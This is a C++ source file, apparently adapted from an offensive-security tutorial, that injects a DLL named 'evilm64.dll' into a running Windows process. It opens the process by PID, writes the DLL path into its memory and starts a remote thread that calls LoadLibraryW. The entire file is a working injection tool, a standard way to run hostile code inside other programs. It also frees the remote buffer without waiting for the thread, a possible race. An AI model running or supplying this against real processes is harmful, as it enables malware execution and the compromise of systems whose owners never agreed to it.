/*
Code refactored from: 
https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection
The changes made include:

Adding error checking for all WinAPI functions that return a value indicating success or failure.
Using std::wstring to represent the DLL path, since it is a wide string literal.
Using std::stoi to convert the argv[1] argument to an integer, rather than atoi.
Using nullptr instead of NULL.
Using reinterpret_cast instead of C-style casts.
Using std::wcout instead of printf for output.
*/

#include <iostream>
#include <Windows.h>
#include <string>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <pid>" << std::endl;
        return 1;
    }

    const std::wstring dllPath = L"C:\\experiments\\evilm64.dll";
    std::wcout << L"Injecting DLL to PID: " << argv[1] << std::endl;

    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, std::stoi(argv[1]));
    if (!processHandle) {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        return 1;
    }

    PVOID remoteBuffer = VirtualAllocEx(processHandle, nullptr, dllPath.size() * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
    if (!remoteBuffer) {
        std::cerr << "Failed to allocate remote memory: " << GetLastError() << std::endl;
        CloseHandle(processHandle);
        return 1;
    }

    if (!WriteProcessMemory(processHandle, remoteBuffer, dllPath.c_str(), dllPath.size() * sizeof(wchar_t), nullptr)) {
        std::cerr << "Failed to write to remote memory: " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    PTHREAD_START_ROUTINE threadStartRoutineAddress = reinterpret_cast<PTHREAD_START_ROUTINE>(GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW"));
    if (!threadStartRoutineAddress) {
        std::cerr << "Failed to get thread start routine address: " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    HANDLE remoteThread = CreateRemoteThread(processHandle, nullptr, 0, threadStartRoutineAddress, remoteBuffer, 0, nullptr);
    if (!remoteThread) {
        std::cerr << "Failed to create remote thread: " << GetLastError() << std::endl;
        VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(processHandle);
        return 1;
    }

    CloseHandle(remoteThread);
    VirtualFreeEx(processHandle, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(processHandle);
    return 0;
}
